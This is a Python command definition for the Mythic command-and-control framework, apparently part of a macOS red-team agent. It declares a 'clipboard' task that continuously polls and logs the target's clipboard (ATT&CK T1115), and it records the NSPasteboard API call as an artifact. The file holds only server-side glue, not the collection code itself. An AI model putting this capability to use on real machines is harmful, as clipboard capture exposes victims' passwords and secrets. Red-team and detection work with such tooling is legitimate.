from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class ClipboardArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ClipboardCommand(CommandBase):
    cmd = "clipboard"
    needs_admin = False
    help_cmd = "clipboard"
    description = "Monitors for any change to the system clipboard and logs it. Runs a while loop to continuously poll the clipboard, kill prematurely with 'jobkill'. Root has no clipboard!"
    version = 1
    author = "@slyd0g"
    attackmapping = ["T1115"]
    argument_class = ClipboardArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
                artifact="$.NSPasteboard.generalPasteboard.dataForType",
                artifact_type="API Called",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass